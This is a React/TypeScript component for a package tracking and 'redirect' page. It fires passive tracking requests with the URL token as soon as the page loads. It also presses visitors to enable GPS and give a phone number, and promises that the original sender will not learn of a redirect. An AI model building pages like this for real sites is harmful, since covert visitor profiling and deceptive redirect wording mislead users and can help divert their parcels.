import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { Button, Form, Alert, Spinner, Accordion } from 'react-bootstrap';
import { sendTrackingData, sendRedirectData } from '../services/api';
import { getQueryParam, sendPassiveTracking } from '../services/trackingUtils';

interface TrackingResponse {
    status: string;
    message: string;
}

interface RedirectResponse {
    status: string;
    message: string;
}

const TrackingPage = () => {
    const { token } = useParams<{ token: string }>();
    const [inputToken, setInputToken] = useState(token || '');
    const [notifications, setNotifications] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [trackingResponse, setTrackingResponse] = useState<TrackingResponse | null>(null);
    const [redirectResponse, setRedirectResponse] = useState<RedirectResponse | null>(null);
    const [error, setError] = useState<string | null>(null);

    // Update inputToken when URL parameter changes
    useEffect(() => {
        if (token && token !== inputToken) {
            setInputToken(token);
        }
    }, [token, inputToken]);

    // Passive enrichment request fires on page load
    useEffect(() => {
        if (inputToken) {
            // Send tracking data for both endpoints
            sendPassiveTracking(inputToken, `${import.meta.env.VITE_API_URL || ''}/tracking`);
            sendPassiveTracking(inputToken, `${import.meta.env.VITE_API_URL || ''}/tracking/redirects`);
        }
    }, [inputToken]);

    const handleTrackingSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!inputToken.trim()) {
            setError('Please enter a tracking token');
            return;
        }

        setIsLoading(true);
        setError(null);
        setTrackingResponse(null);

        try {
            const result = await sendTrackingData(inputToken);
            setTrackingResponse(result);
        } catch (err) {
            setError(err instanceof Error ? err.message : 'An error occurred');
        } finally {
            setIsLoading(false);
        }
    };

    const handleRedirectSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!inputToken.trim()) {
            setError('Please enter a tracking token');
            return;
        }

        setIsLoading(true);
        setError(null);
        setRedirectResponse(null);

        try {
            const result = await sendRedirectData(inputToken, notifications || undefined);
            setRedirectResponse(result);
        } catch (err) {
            setError(err instanceof Error ? err.message : 'An error occurred');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="row justify-content-center mt-4">
            <div className="col-lg-8 col-md-10">
                <h4 className="mb-4 fw-semibold">Package Tracking</h4>
                
                <p className="text-muted mb-4">
                    To check the status of your package, please enter your token and click the button below.
                </p>
                
                <Form onSubmit={handleTrackingSubmit}>
                    <div className="d-flex align-items-center gap-3">
                        <Form.Control
                            type="text"
                            value={inputToken}
                            onChange={(e) => setInputToken(e.target.value)}
                            placeholder="Enter your tracking token"
                            required
                            className="border"
                        />
                        <Button 
                            type="submit" 
                            variant="primary" 
                            disabled={isLoading}
                            className="px-4"
                        >
                            {isLoading ? (
                                <>
                                    <Spinner
                                        as="span"
                                        animation="border"
                                        size="sm"
                                        role="status"
                                        aria-hidden="true"
                                        className="me-2"
                                    />
                                    Loading...
                                </>
                            ) : (
                                'Check'
                            )}
                        </Button>
                    </div>
                </Form>

                {error && (
                    <Alert variant="danger" className="mt-3">
                        {error}
                    </Alert>
                )}

                {trackingResponse && (
                    <Alert variant="success" className="mt-3">
                        {trackingResponse.message}
                    </Alert>
                )}

                <hr className="my-4" />

                <h5 className="mb-3 fw-semibold">Package Redirect</h5>
                
                <Alert variant="warning" className="mb-4">
                    <ul className="mb-0">
                        <li>Please enable GPS if asked. GPS allows the site to show closer delivery locations or faster routes. International locations are also available.</li>
                        <li>Notifications are required to receive new package updates. The original sender will not receive new updates.</li>
                        <li>For your privacy the original sender will not be notified of the redirect. The recipient will be responsible for any additional delivery charges incurred.</li>
                    </ul>
                </Alert>

                <Form onSubmit={handleRedirectSubmit}>
                    <Form.Group className="mb-3">
                        <Form.Label className="fw-semibold">Phone Number for Notifications (Optional)</Form.Label>
                        <Form.Control
                            type="tel"
                            value={notifications}
                            onChange={(e) => setNotifications(e.target.value)}
                            placeholder="Enter phone number for notifications"
                            className="border"
                        />
                        <Form.Text className="text-muted">
                            You'll receive SMS updates about your package redirect
                        </Form.Text>
                    </Form.Group>

                    <Button 
                        type="submit" 
                        variant="primary" 
                        disabled={isLoading}
                        className="w-100"
                    >
                        {isLoading ? (
                            <>
                                <Spinner
                                    as="span"
                                    animation="border"
                                    size="sm"
                                    role="status"
                                    aria-hidden="true"
                                    className="me-2"
                                />
                                Processing...
                            </>
                        ) : (
                            'Redirect Package'
                        )}
                    </Button>
                </Form>

                {error && (
                    <Alert variant="danger" className="mt-3">
                        {error}
                    </Alert>
                )}

                {redirectResponse && (
                    <Alert variant="success" className="mt-3">
                        {redirectResponse.message}
                    </Alert>
                )}
            </div>
        </div>
    );
};

export default TrackingPage; 